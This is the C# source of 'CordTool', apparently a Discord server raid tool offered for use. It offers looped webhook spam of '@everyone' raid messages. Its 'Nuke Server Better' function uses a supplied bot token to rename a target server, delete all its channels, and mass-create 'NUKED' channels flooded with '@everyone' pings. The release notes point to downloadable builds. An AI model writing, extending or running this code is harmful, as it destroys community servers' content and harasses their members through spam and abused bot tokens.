using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using DSharpPlus;
using DSharpPlus.CommandsNext;
using System.Threading;
using System.Security.Authentication;
using System.Windows.Forms;

namespace CordTool
{
    internal class Program
    {
        static void Main(string[] args)
        {
            while (true)
            {
                Console.Title = "CordTool";
                Banner();
                Menu();
                ConsoleKeyInfo input = Console.ReadKey();
                char option = input.KeyChar;
                Console.WriteLine(option);
                switch (option)
                {
                    case '1':
                        webhookMessage();
                        Console.Clear();
                        Console.WriteLine("Message sent! Check your Discord client to check if it succeeded.");
                        break;
                    case '5':
                        return;
                    case '4':
                        nukeServerBetter();
                        Console.Clear();
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("N");
                        Console.Clear();
                        Thread.Sleep(900);
                        Console.WriteLine("Nu");
                        Console.Clear();
                        Thread.Sleep(900);
                        Console.WriteLine("Nuk");
                        Console.Clear();
                        Thread.Sleep(900);
                        Console.WriteLine("Nuke");
                        Console.Clear();
                        Thread.Sleep(900);
                        Console.WriteLine("Nuked");
                        Console.Clear();
                        Thread.Sleep(900);
                        Console.WriteLine("Nuked!");
                        Console.ResetColor();
                        break;
                    case '2':
                        nukeServer();
                        Console.Clear();
                        Console.WriteLine("Nuked!");
                        break;
                    case '3':
                        loginBot();
                        break;
                    case 'P':
                        releaseNotes();
                        break;
                    case 'p':
                        releaseNotes();
                        break;
                    case 'Y':
                        CordToolGUI();
                        break;
                    case 'y':
                        CordToolGUI();
                        break;
                }
            }
        }

        static void Banner()
        {
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(@"


       _..._                                                                                             
    .-'_..._''.                          _______                                                   .---. 
  .' .'      '.\                         \  ___ `'.                                                |   | 
 / .'                                     ' |--.\  \                                               |   | 
. '                 .-''` ''-.    .-,.--. | |    \  '      .|      .-''` ''-.        .-''` ''-.    |   | 
| |               .'          '.  |  .-. || |     |  '   .' |_   .'          '.    .'          '.  |   | 
| |              /              ` | |  | || |     |  | .'     | /              `  /              ` |   | 
. '             '                '| |  | || |     ' .''--.  .-''                ''                '|   | 
 \ '.          .|         .-.    || |  '- | |___.' /'    |  |  |         .-.    ||         .-.    ||   | 
  '. `._____.-'/.        |   |   .| |    /_______.'/     |  |  .        |   |   ..        |   |   .|   | 
    `-.______ /  .       '._.'  / | |    \_______|/      |  '.' .       '._.'  /  .       '._.'  / '---' 
             `    '._         .'  |_|                    |   /   '._         .'    '._         .'  - @Epicinver :)    
                     '-....-'`                           `'-'       '-....-'`         '-....-'`          
");
            Console.ResetColor();
            Console.WriteLine("CordTool - A tool for managing and interacting with Discord webhooks.");
            Console.WriteLine("Developed by: Arran :)");
            Console.WriteLine("Version: 3.0.0 (Release notes: Type P)");
        }
        static void Menu()
        {
            Console.WriteLine("\n1. Send Webhook Message");
            Console.WriteLine("2. Nuke Server");
            Console.WriteLine("3. Login to a Bot");
            Console.WriteLine("4. Nuke Server Better (Reccommended)");
            Console.WriteLine("5. Exit");
            Console.WriteLine("P. Release Notes");
            Console.WriteLine("Y. GUI version");
        }

        static async void webhookMessage()
        {
            Console.Clear();
            Console.Write("Webhook URL: ");
            string webhook = Console.ReadLine();

            Console.Write("Message: ");
            string message = Console.ReadLine();

            string json = $"{{\"content\": \"{message}\"}}";

            using (HttpClient client = new HttpClient())
            {
                HttpContent content = new StringContent(json, Encoding.UTF8, "application/json");
                await client.PostAsync(webhook, content);
            }
        }
        static async void nukeServer()
        {
            Console.Clear();
            Console.Write("Webhook URL: ");
            string webhook = Console.ReadLine();

            Console.Write("How many times should the loop go for? Enter: ");
            int looptimes;
            while (!int.TryParse(Console.ReadLine(), out looptimes) || looptimes <= 0)
            {
                Console.Write("Please enter a valid positive number: ");
            }

            Console.Write("What server invite should the webhook spam? [We spam this: RAIDED BY (Your server invite).] Enter: ");
            string serverinv = Console.ReadLine();

            string message = $"RAIDED BY {serverinv} @everyone";

            string json = $"{{\"content\": \"{message}\"}}";

            using (HttpClient client = new HttpClient())
            {
                for (int i = 0; i < looptimes; i++)
                {
                    HttpContent content = new StringContent(json, Encoding.UTF8, "application/json");
                    await client.PostAsync(webhook, content);
                }
            }


        }

        static async void loginBot()
        {
            Console.Clear();
            Console.WriteLine("The log into a bot feature is in developement. Maybe try upgrade CordTool? ");
        }

        static async void nukeServerBetter()
        {
            Console.Clear();
            Console.Write("Bot Token: ");
            string Token = Console.ReadLine();

            Console.Write("Name override: ");
            string serverNameOverRide = Console.ReadLine();

            Console.Write("Server ID: ");
            string guildId = Console.ReadLine();

            Console.Write("Discord invite link: ");
            string serverInvite = Console.ReadLine();
            for (int i = 0; i < 1000000; i++)
            {




                var discord = new DiscordClient(new DiscordConfiguration()
                {
                    Token = Token,
                    TokenType = TokenType.Bot
                });

                await discord.ConnectAsync();

                var guild = await discord.GetGuildAsync(ulong.Parse(guildId)); // Your guild ID
                await guild.ModifyAsync(g => g.Name = serverNameOverRide);

                await discord.DisconnectAsync();

                Console.WriteLine("Something is happening in the Nuke function.");

                var channels = await guild.GetChannelsAsync();
                foreach (var channel in channels)
                {
                    try
                    {
                        await channel.DeleteAsync();

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Something is happening in the Nuke function.");
                    }
                }

                for (int j = 0; j < 100000; j++)
                {
                    try
                    {
                        var channel = await guild.CreateTextChannelAsync($"NUKED-{j}");
                        for (int k = 0; k < 5; k++)
                        {
                            await channel.SendMessageAsync($"NUKED BY {serverInvite} @everyone");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Something happened during the nuke, and we don't know how to fix it. Here's the error code: {ex.Message}");
                    }
                }
            }
        }
        static void releaseNotes()
        {
            Console.Clear();
            Console.WriteLine("Release Notes for CordTool");
            Console.WriteLine("Type the version below.");
            ConsoleKeyInfo input = Console.ReadKey();
            char option = input.KeyChar;
            Console.WriteLine(option);
            switch (option)
            {
                case '1':
                    Console.WriteLine("Version 1.0.0 - Initial release with basic features.");
                    Console.WriteLine("There is 4 options: Nuke Server, Login to a bot, and send webhook message. The last is Exit, but that doesn't count.");
                    Console.WriteLine("This version can be downloaded at: https://github.com/Epicinver/CordTool/releases/download/Discord/DiscordHatesMe.zip");
                    Console.WriteLine("Click any key to exit.");
                    Console.ReadKey();
                    Console.Clear();
                    break;
                case '2':
                    Console.WriteLine("Version 2.0.0 - Second release, not much.");
                    Console.WriteLine("There is 6 options: Nuke Server, Login to a bot, Send webhook message, Nuke Server (Better), and the Release Notes. The last is Exit, but that doesn't count.");
                    Console.WriteLine("This version can be downloaded at: https://github.com/Epicinver/CordTool/releases/download/v2.0.0/Cordtool.zip");
                    Console.WriteLine("Click any key to exit.");
                    Console.ReadKey();
                    Console.Clear();
                    break;
                case '3':
                    Console.WriteLine("Version 3.0.0 - GUI version fully integrated.");
                    Console.WriteLine("A GUI version has been added, along with a few bug fixes!");
                    Console.WriteLine("The GUI was made in Windows Forms, with simple C#, and the Visual Studio Designer view.");
                    Console.WriteLine("This version can be downloaded at: https://github.com/Epicinver/CordTool/releases/download/v3.0.0/Cordtool.zip");
                    Console.WriteLine("Click any key to exit.");
                    Console.ReadKey();
                    Console.Clear();
                    break;
            }
        }

static void CordToolGUI()
    {
        Console.Clear();
        Console.WriteLine("Minimise this window and focus on the GUI.");
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new Form1());
        Console.Clear();
    }

}
}